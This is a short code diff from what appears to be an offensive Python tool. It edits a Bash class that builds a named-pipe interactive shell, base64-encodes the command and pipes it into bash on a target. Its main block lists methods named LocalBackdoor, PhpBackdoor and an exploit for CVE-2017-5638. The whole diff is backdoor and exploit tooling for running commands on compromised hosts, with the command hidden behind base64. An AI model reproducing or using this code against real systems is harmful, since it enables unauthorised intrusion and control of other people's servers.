@@ -132,7 +132,7 @@ class Bash(Shell):
         command += f'rm {self.inpath} {self.outpath};'
         command += f'mkfifo {self.inpath} {self.outpath};'
         command += f'exec 3<>{self.outpath};'
-        command += f'tail -f {self.inpath} | bash > {self.outpath} 2>&1;'
+        command += f'tail -f {self.inpath} | bash 1>&3 2>&3;'
         command = b64encode(command.encode()).decode()
         command =f'echo -n {command} | base64 -d | bash'
         self.system(command)
@@ -164,8 +164,8 @@ def read_task(shell, interval=1):
 
 if __name__ == '__main__':
     method = {
-            'local' : LocalBackdoor,
-            'php' : PhpBackdoor,
+            'local': LocalBackdoor,
+            'php': PhpBackdoor,
             'CVE-2017-5638': CVE_2017_5638
     }
 
